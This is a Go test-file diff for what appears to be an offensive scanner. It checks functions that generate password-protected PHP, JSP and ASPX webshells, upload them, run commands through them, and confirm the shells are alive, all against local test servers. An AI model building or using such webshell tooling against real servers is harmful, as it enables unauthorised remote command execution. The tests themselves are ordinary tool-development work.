@@ -3,7 +3,9 @@ package scanner
 import (
 	"context"
 	"encoding/base64"
+	"errors"
 	"io"
+	"net"
 	"net/http"
 	"net/http/httptest"
 	"strings"
@@ -38,17 +40,38 @@ func TestBuildBypassVariants(t *testing.T) {
 }
 
 func TestBuildShellPayload(t *testing.T) {
-	php := BuildShellPayload("php", "s3cr3t")
+	php, err := BuildShellPayload("php", "s3cr3t")
+	if err != nil {
+		t.Fatalf("php payload: %v", err)
+	}
 	if !strings.Contains(php.Content, "s3cr3t") || php.Filename != "shell.php" {
 		t.Fatalf("php payload: %+v", php)
 	}
-	jsp := BuildShellPayload("jsp", "s3cr3t")
+	if php.SHA256 == "" {
+		t.Fatal("legacy payload should carry a SHA-256 fingerprint")
+	}
+	jsp, err := BuildShellPayload("jsp", "s3cr3t")
+	if err != nil {
+		t.Fatalf("jsp payload: %v", err)
+	}
 	if !strings.Contains(jsp.Content, "s3cr3t") || !strings.Contains(jsp.Content, "Runtime.getRuntime") {
 		t.Fatalf("jsp payload: %+v", jsp)
 	}
-	aspx := BuildShellPayload("aspx", "s3cr3t")
+	if !strings.Contains(jsp.Content, "cmd.exe") || !strings.Contains(jsp.Content, "/bin/sh") {
+		t.Fatalf("jsp payload should support Windows and POSIX: %+v", jsp)
+	}
+	aspx, err := BuildShellPayload("aspx", "s3cr3t")
+	if err != nil {
+		t.Fatalf("aspx payload: %v", err)
+	}
 	if !strings.Contains(aspx.Content, "s3cr3t") || !strings.Contains(aspx.Content, "Process") {
 		t.Fatalf("aspx payload: %+v", aspx)
+	}
+	if !strings.Contains(aspx.Content, "cmd.exe") || strings.Contains(aspx.Content, "FileName = \"/bin/sh\";") {
+		t.Fatalf("aspx payload still hardcodes /bin/sh: %+v", aspx)
+	}
+	if _, err := BuildShellPayload("php", "  "); err == nil {
+		t.Fatal("empty legacy password must be rejected, not defaulted")
 	}
 }
 
@@ -75,7 +98,10 @@ func TestUploadWebshellMultipart(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	payload := BuildShellPayload("php", "pw")
+	payload, err := BuildShellPayload("php", "pw")
+	if err != nil {
+		t.Fatalf("payload: %v", err)
+	}
 	res := UploadWebshell(context.Background(), NewDeepClient(5*time.Second), srv.URL, "file", payload.Filename, []byte(payload.Content), map[string]string{"dir": "/upload"}, nil)
 	if !res.Success || res.StatusCode != 200 {
 		t.Fatalf("upload failed: %+v", res)
@@ -101,7 +127,10 @@ func TestNormalizeUploadURL(t *testing.T) {
 }
 
 func TestWebshellCommandRoundTrip(t *testing.T) {
-	payload := BuildShellPayload("php", "pw")
+	payload, err := BuildShellPayload("php", "pw")
+	if err != nil {
+		t.Fatalf("payload: %v", err)
+	}
 	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		_ = r.ParseForm()
 		cmd := r.PostFormValue("pw")
@@ -126,6 +155,46 @@ func TestWebshellCommandRoundTrip(t *testing.T) {
 	alive, note := CheckShellAlive(context.Background(), NewDeepClient(5*time.Second), srv.URL, payload)
 	if !alive {
 		t.Fatalf("shell not alive: %s", note)
+	}
+}
+
+// The webshell terminal reports "we stopped waiting, the target may still be
+// working" only if it can tell a client deadline from a refused connection, and
+// it reads that with errors.Is/errors.As. Flattening the transport error to a
+// string in DeepResponse took the cause away, so the wait looked like a crash.
+func TestRunShellCommandKeepsDeadlineCause(t *testing.T) {
+	mk := func(tb testing.TB, protocol string) ShellPayload {
+		tb.Helper()
+		if protocol == ShellProtocolV2 {
+			p, err := BuildShellPayloadV2("php", []byte("0123456789abcdef0123456789abcdef"), "tplRender")
+			if err != nil {
+				tb.Fatalf("v2 payload: %v", err)
+			}
+			return p
+		}
+		p, err := BuildShellPayload("php", "pw")
+		if err != nil {
+			tb.Fatalf("v1 payload: %v", err)
+		}
+		return p
+	}
+	for _, protocol := range []string{ShellProtocolLegacy, ShellProtocolV2} {
+		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			time.Sleep(400 * time.Millisecond)
+			_, _ = w.Write([]byte("late"))
+		}))
+		_, err := RunShellCommand(context.Background(), NewDeepClient(60*time.Millisecond), srv.URL, mk(t, protocol), "sleep 5")
+		srv.Close()
+		if err == nil {
+			t.Fatalf("%s: expected deadline error", protocol)
+		}
+		if !errors.Is(err, context.DeadlineExceeded) {
+			t.Fatalf("%s: cause lost, errors.Is(DeadlineExceeded) false for %v", protocol, err)
+		}
+		var netErr net.Error
+		if !errors.As(err, &netErr) || !netErr.Timeout() {
+			t.Fatalf("%s: not a net.Error timeout: %v", protocol, err)
+		}
 	}
 }
 
